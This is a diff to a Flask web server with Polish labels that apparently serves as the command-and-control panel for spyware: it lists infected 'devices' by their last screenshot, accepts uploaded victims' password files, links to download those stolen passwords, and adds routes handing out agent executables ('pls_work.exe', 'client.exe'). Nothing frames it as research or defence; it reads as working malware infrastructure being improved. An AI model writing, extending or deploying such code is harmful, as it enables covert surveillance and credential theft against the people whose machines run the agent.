@@ -1,4 +1,4 @@
-from flask import Flask, request, send_file, jsonify, render_template_string, redirect, url_for
+from flask import Flask, request, send_file, jsonify, render_template_string, redirect, url_for, send_from_directory
 import os
 import datetime
 import json
@@ -37,11 +37,16 @@ def index():
         except:
             device_list.append((u, "🔴", "błąd daty", has_passwords))
 
-    content = f"<h1>Urządzenia: {len(device_list)}</h1><ul>"
+    content = f"""
+    <h1>Urządzenia: {len(device_list)}</h1>
+    <p><a href='/download_agent'>⬇️ Pobierz agenta (pls_work.exe)</a></p>
+    <p><a href='/download_client'>⬇️ Pobierz klienta (client.exe)</a></p>
+    <ul>
+    """
     for u, status, t, has_passwords in device_list:
         content += f'<li>{status} <a href="/view?user={u}">{u}</a> (ostatni screen: {t}) | <a href="/history?user={u}">Historia</a>'
         if has_passwords:
-            content += f' | <a href="/download_passwords/{u}">🔐 Hasła</a>'
+            content += f' | <a href="/screens/{u}/passwords.dat" download>🔐 Hasła</a>'
         content += '</li>'
     content += "</ul>"
     return content
@@ -178,34 +183,35 @@ def command():
 
 @app.route("/upload_passwords", methods=['POST'])
 def upload_passwords():
-    user = request.form.get("user")
-    if not user:
-        return "Brak ID użytkownika", 400
+    try:
+        user = request.form.get("user")
+        if not user:
+            return "Brak ID użytkownika", 400
 
-    folder = os.path.join("screens", user)
-    os.makedirs(folder, exist_ok=True)
+        folder = os.path.join("screens", user)
+        os.makedirs(folder, exist_ok=True)
 
-    if 'data' not in request.files:
-        return "Brak pliku 'data'", 400
+        if 'data' not in request.files:
+            return "Brak pliku 'data'", 400
 
-    file = request.files['data']
-    filepath = os.path.join(folder, "passwords.dat")
-    file.save(filepath)
+        file = request.files['data']
+        filepath = os.path.join(folder, "passwords.dat")
+        file.save(filepath)
 
-    # marker by urządzenie było widoczne
-    with open(os.path.join(folder, "received_passwords.txt"), "w") as f:
-        f.write(datetime.now().isoformat())
+        with open(os.path.join(folder, "received_passwords.txt"), "w") as f:
+            f.write(datetime.datetime.now().isoformat())
 
-    return "OK"
+        return "OK"
+    except Exception as e:
+        return f"Błąd serwera: {str(e)}", 500
 
-@app.route("/download_passwords/<user>")
-def download_passwords(user):
-    folder = os.path.join("screens", user)
-    filepath = os.path.join(folder, "passwords.dat")
-    if not os.path.exists(filepath):
-        return "Plik nie istnieje", 404
-    return send_file(filepath, as_attachment=True, download_name="passwords.dat")
+@app.route("/download_agent")
+def download_agent():
+    return send_from_directory("client_download", "pls_work.exe", as_attachment=True)
 
+@app.route("/download_client")
+def download_client():
+    return send_from_directory("client_download", "client.exe", as_attachment=True)
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
